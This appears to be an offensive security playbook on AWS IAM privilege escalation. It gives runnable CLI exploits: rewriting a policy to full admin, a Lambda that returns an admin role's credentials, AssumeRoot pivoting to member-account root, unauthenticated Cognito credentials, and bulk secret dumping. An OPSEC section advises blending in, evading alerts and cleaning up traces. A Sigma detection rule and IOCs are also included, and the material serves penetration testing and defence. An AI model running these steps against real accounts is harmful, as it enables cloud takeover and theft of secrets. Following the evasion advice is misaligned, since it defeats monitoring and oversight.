# AWS IAM Privilege Escalation & Cross-Account Abuse

CWE-269 (Improper Privilege Management), CWE-441 (Confused Deputy), CWE-732 (Incorrect Permission Assignment).
ATT&CK: T1098.001 (Additional Cloud Credentials), T1078.004 (Cloud Accounts), T1548 (Abuse Elevation Control).

## Theory / Mechanism

AWS IAM grants are additive and evaluated against every principal+action+resource. Privilege
escalation happens when a low-privileged principal holds a single "primitive" permission that lets
it grant itself more — directly (rewrite a policy) or indirectly (make a more-privileged service
do the work, i.e. a confused deputy). Rhino Security Labs catalogued ~21 primitives; they still
work because STS and several IAM actions cannot be constrained granularly by resource policies
(there is no "resource" for a session-issuance policy to attach to).

### The canonical primitives (still valid 2024-2026)

| Primitive permission(s) | Escalation |
|-------------------------|------------|
| `iam:CreatePolicyVersion` (+ `--set-as-default`) | Rewrite a policy you can edit → `*:*` admin |
| `iam:SetDefaultPolicyVersion` | Activate an older, more-permissive version |
| `iam:AttachUserPolicy` / `AttachRolePolicy` / `AttachGroupPolicy` | Attach `AdministratorAccess` |
| `iam:PutUserPolicy` / `PutRolePolicy` (inline) | Inline an admin policy |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | Set/replace console password of any user |
| `iam:CreateAccessKey` | Mint long-lived keys for another user |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Run code as an admin role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with an admin instance profile, read its creds |
| `iam:PassRole` + `glue:CreateDevEndpoint` / `cloudformation:CreateStack` / `datapipeline` | Same idea, different service |
| `iam:AddUserToGroup` | Join an admin group |
| `sts:AssumeRole` (overly broad trust) | Assume a privileged role |
| `lambda:UpdateFunctionCode` | Backdoor an existing function that runs as a privileged role |

## Working enumeration → privesc

```bash
# Identity + full authorization snapshot
aws sts get-caller-identity
aws iam get-account-authorization-details > authz.json   # users, roles, policies, attachments

# Your own permissions
WHO=$(aws sts get-caller-identity --query Arn --output text)
aws iam simulate-principal-policy --policy-source-arn "$WHO" \
  --action-names iam:CreatePolicyVersion iam:AttachUserPolicy iam:PassRole \
                 sts:AssumeRole lambda:CreateFunction ec2:RunInstances \
  --query 'EvaluationResults[].{Action:EvalActionName,Decision:EvalDecision}' --output table

# Automated: our enumerator scores every privesc path from authz.json
python3 ../scripts/aws_privesc_enum.py --profile compromised --json paths.json

# Or Pacu
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan
```

### Exploit: CreatePolicyVersion → admin

```bash
POLICY_ARN=arn:aws:iam::111122223333:policy/EditablePolicy
cat > admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version --policy-arn "$POLICY_ARN" \
  --policy-document file://admin.json --set-as-default
# The principal that has this policy attached is now full admin.
```

### Exploit: PassRole + Lambda → admin creds

```bash
cat > index.py <<'EOF'
import boto3, os, json
def handler(event, context):
    c = boto3.client('sts').get_caller_identity()
    # exfil the role's session creds from the runtime
    return {"identity": c, "env": {k: v for k, v in os.environ.items() if 'AWS' in k}}
EOF
zip -q f.zip index.py
aws lambda create-function --function-name esc --runtime python3.12 \
  --role arn:aws:iam::111122223333:role/SomeAdminRole \
  --handler index.handler --zip-file fileb://f.zip
aws lambda invoke --function-name esc out.json && cat out.json
# Or have the function call iam:AttachUserPolicy to give yourself admin persistently.
```

## Modern 2024-2026 variants (verified)

### sts:AssumeRoot — member-account root escalation (introduced late 2024)

AWS added `sts:AssumeRoot` so an Organizations management account (or a delegated admin) can get
short-lived credentials for the **root user of a member account**. Unlike `AssumeRole`, the target
is the **member account ID** plus a **task policy ARN** (e.g. `IAMCreateRootUserPassword`,
`S3UnlockBucketPolicy`). An attacker who compromises the management/delegated-admin principal can
pivot to root-equivalent control of every member account.

```bash
# From a compromised Organizations management / delegated-admin identity.
# NOTE: the STS *global* endpoint is NOT supported — must hit a regional endpoint.
aws sts assume-root \
  --target-principal 444455556666 \
  --task-policy-arn arn:aws:iam::aws:policy/root-task/IAMCreateRootUserPassword \
  --region us-east-1
# Returned creds can then iam:CreateLoginProfile for an otherwise-console-less user, etc.
```

Detection: Elastic published a New-Terms rule "AWS STS AssumeRoot by Rare User and Member Account"
(created 2024-11-24) that fires the first time a given (calling principal, target member account)
pair invokes `AssumeRoot`. The event is only in **regional** CloudTrail.

### Cross-account confused deputy / missing or wildcard ExternalId (Praetorian 2024-2025)

Third-party SaaS vendors ask you to create a role they can assume. If the role's trust policy
omits an `sts:ExternalId` condition (or the vendor reuses one ExternalId across all customers),
**any other customer of that vendor** can coerce the vendor's "deputy" into acting on your account
— the confused-deputy problem. Praetorian found this across many top vendors in 2024.

```bash
# Find roles trusting a third-party account WITHOUT an ExternalId condition (vulnerable):
aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}' \
  | jq -r '.[] | select((.Trust|tostring)|contains("ExternalId")|not)
                 | select((.Trust|tostring)|test("AWS"))
                 | .Name'
# Our auditor does this plus OIDC/wildcard checks:
python3 ../scripts/oidc_trust_auditor.py --profile compromised
```

Note the detection gap: a cross-account `AssumeRole` **does not appear in the target account's
CloudTrail unless it succeeds**, so failed brute attempts of ExternalIds are invisible there.
Mitigation: `aws:SourceArn` / `aws:SourceAccount` / `aws:SourceOrgID` conditions + per-customer
ExternalId.

### Cognito Identity Pool unauthenticated role assumption

Misconfigured identity pools that allow unauthenticated identities hand out temporary creds tied
to an IAM role. If that role is over-permissioned, anyone gets it.

```bash
ID=$(aws cognito-identity get-id --identity-pool-id us-east-1:POOL --output text --query IdentityId)
aws cognito-identity get-credentials-for-identity --identity-id "$ID" \
  --query Credentials   # AccessKeyId / SecretKey / SessionToken — check what the role allows
```

## Post-exploitation: secrets & quiet data access

```bash
# Secrets Manager / SSM Parameter Store
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text
aws secretsmanager batch-get-secret-value --secret-id-list $(aws secretsmanager list-secrets --query 'SecretList[].ARN' --output text)
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# Public/shared RDS & EBS snapshots (data exfil without touching prod)
aws rds describe-db-snapshots --snapshot-type public --query 'DBSnapshots[].DBSnapshotIdentifier'
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[].SnapshotId'
```

## Detection

```yaml
title: AWS IAM Privilege Escalation Primitive Usage
id: 4d1f0c6e-aws-iam-privesc
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - CreatePolicyVersion
      - SetDefaultPolicyVersion
      - AttachUserPolicy
      - AttachRolePolicy
      - PutUserPolicy
      - PutRolePolicy
      - CreateLoginProfile
      - UpdateLoginProfile
      - AddUserToGroup
      - CreateAccessKey
  filter_admins:
    userIdentity.arn|contains:
      - ':role/AWSReservedSSO_Admin'
      - ':user/break-glass'
  condition: selection and not filter_admins
level: high
falsepositives: [legitimate IAM administration, IaC pipelines]
```

Additional signals: GuardDuty findings `PrivilegeEscalation:IAMUser/AdministrativePermissions`,
`PrivilegeEscalation:IAMUser/AnomalousBehavior`; AssumeRoot via the Elastic new-terms rule; STS
`AssumeRoleWithWebIdentity` from unexpected `sub` (see iac-secrets-ci-cd.md).

IOCs: a single principal performing IAM read-enum (`get-account-authorization-details`,
`SimulatePrincipalPolicy`) immediately followed by an IAM write; new access keys / login profiles
for dormant users; Lambda/EC2 created with a role the creator does not normally pass.

## OPSEC

- `get-account-authorization-details` and `iam:SimulatePrincipalPolicy` are read-only but logged;
  they are the classic precursor pair detection rules look for. Spread enumeration over time or
  reuse legitimate admin tooling/sessions to blend in.
- Prefer **indirect** escalation (PassRole→Lambda/EC2) over rewriting a default policy version —
  policy-version changes are a high-signal alert and visible in IAM history.
- Created EC2/Lambda artifacts persist; clean them up (`delete-function`, `terminate-instances`)
  and consider not leaving an admin login profile behind (rotate to a role you can re-assume).
- `AssumeRoot` is **rare-event detected** — using it will almost certainly alert on first use.
- Cross-account assume failures are invisible in the target account but **are** logged in *your*
  (attacker) account.

## References

- Elastic Security Labs, "Exploring AWS STS AssumeRoot" — https://www.elastic.co/security-labs/exploring-aws-sts-assumeroot
- Elastic detection-rules: `privilege_escalation_sts_assume_root_from_rare_user_and_member_account.toml` — https://github.com/elastic/detection-rules
- AWS docs, `AssumeRoot` API reference — https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoot.html
- Praetorian, "AWS IAM Assume Role Vulnerabilities Found in Many Top Vendors" (2024) — https://www.praetorian.com/blog/aws-iam-assume-role-vulnerabilities/
- AWS docs, "The confused deputy problem" — https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html
- Rhino Security Labs, "AWS IAM Privilege Escalation – Methods and Mitigation" — https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ ; repo https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
